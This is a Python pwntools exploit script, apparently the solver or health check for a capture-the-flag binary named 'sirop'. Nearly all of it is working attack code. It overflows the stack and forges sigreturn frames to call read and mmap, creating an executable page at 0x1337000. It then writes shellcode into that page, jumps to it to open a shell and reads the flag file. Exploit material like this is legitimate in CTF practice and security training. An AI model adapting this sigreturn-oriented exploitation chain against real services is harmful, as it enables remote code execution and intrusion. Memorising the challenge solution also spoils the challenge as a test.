#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ../artifacts/sirop --host chall --port 2000
from pwn import *

# Set up pwntools for the correct architecture
# exe = context.binary = ELF("../artifacts/sirop")
exe = context.binary = ELF("/home/health/sirop")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "chall"
port = int(args.PORT or 2000)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak *0x{exe.entry:x}
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

MEME = 0x401033
SYSCALL_GADGET = 0x000000000040100B
WRITEABLE = 0x00000000402000

io = start()

try:
    io.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
except:
    pass

frame = SigreturnFrame()
payload = b"A" * 0x118 + p64(SYSCALL_GADGET)
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = WRITEABLE
frame.rdx = 0x1000
frame.rip = SYSCALL_GADGET
frame.rsp = WRITEABLE + 0x130
payload = payload + bytes(frame)
io.sendafter(b"desire", payload)
io.sendafter(b"all", b"A" * 15)
sleep(1)
io.send(p64(MEME) * (0x1000 // 8))

log.info("STACK PREPARED")
# ===================================
frame = SigreturnFrame()
payload = b"A" * 0x118 + p64(SYSCALL_GADGET)
frame.rax = constants.SYS_mmap
frame.rdi = 0x1337000
frame.rsi = 0x1000
frame.rdx = 0x7
frame.r10 = 34
frame.rip = SYSCALL_GADGET
frame.rsp = WRITEABLE + 0x300
payload = payload + bytes(frame)
io.send(payload)
io.recv(100)
io.send(b"A" * 15)
log.info("MMAP")

# ===================================
frame = SigreturnFrame()
payload = b"A" * 0x118 + p64(SYSCALL_GADGET)
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = 0x1337000
frame.rdx = 0x300
frame.rip = SYSCALL_GADGET
frame.rsp = WRITEABLE + 0x600
payload = payload + bytes(frame)
io.send(payload)
io.recv(100)
io.send(b"A" * 15)
sleep(1)
io.send(asm(shellcraft.sh()))
log.info("SHELL PUT")

# ===================================
frame = SigreturnFrame()
payload = b"A" * 0x118 + p64(SYSCALL_GADGET)
frame.rip = 0x1337000
frame.rsp = WRITEABLE + 0x600
payload = payload + bytes(frame)
io.send(payload)
io.recv(100)
io.send(b"A" * 15)
log.info("SHELL EXEC")
# # =====================================
# frame = SigreturnFrame()
# payload = b"A" * 0x118 + p64(SYSCALL_GADGET)
# frame.rax = constants.SYS_read
# frame.rdi = 0
# frame.rsi = 0x1337000
# frame.rdx = 0x200
# frame.rip = SYSCALL_GADGET
# frame.rsp = 0x1337000 + 0x400
# payload = payload + bytes(frame) + p64(0x1337000)
# io.sendafter(b"desire", payload)
# sleep(3)
# io.sendafter("all", b"A" * 15)
# # =====================================
# io.send(shellcraft.amd64.linux.sh())

io.sendline(b"echo MARKERPOP")
io.recvuntil(b"MARKERPOP")
io.sendline(b"cat /home/ctf/flag.txt")

flag = io.clean(timeout=1.0).decode().strip()

log.success(flag)

assert flag == open("/home/health/flag.txt", "r").read().strip()
